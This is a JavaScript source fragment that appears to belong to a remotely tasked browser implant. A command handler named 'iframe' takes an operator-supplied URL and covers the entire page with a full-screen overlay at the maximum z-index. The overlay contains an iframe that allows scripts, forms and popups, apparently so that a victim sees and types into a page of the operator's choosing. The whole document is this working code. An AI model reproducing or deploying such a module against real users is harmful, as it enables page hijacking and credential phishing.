COMMANDS['iframe'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var url = (params && params.url) ? params.url : '';
    if (!url) return 'error: url parameter required';

    // Remove existing overlay if present
    var existing = document.getElementById('__tyche_overlay');
    if (existing) existing.remove();

    // Create overlay container
    var overlay = document.createElement('div');
    overlay.id = '__tyche_overlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:#fff;';

    // Create iframe
    var frame = document.createElement('iframe');
    frame.src = url;
    frame.style.cssText = 'width:100%;height:100%;border:none;';
    frame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox');

    overlay.appendChild(frame);
    document.body.appendChild(overlay);

    return 'Overlay active: ' + url;
};
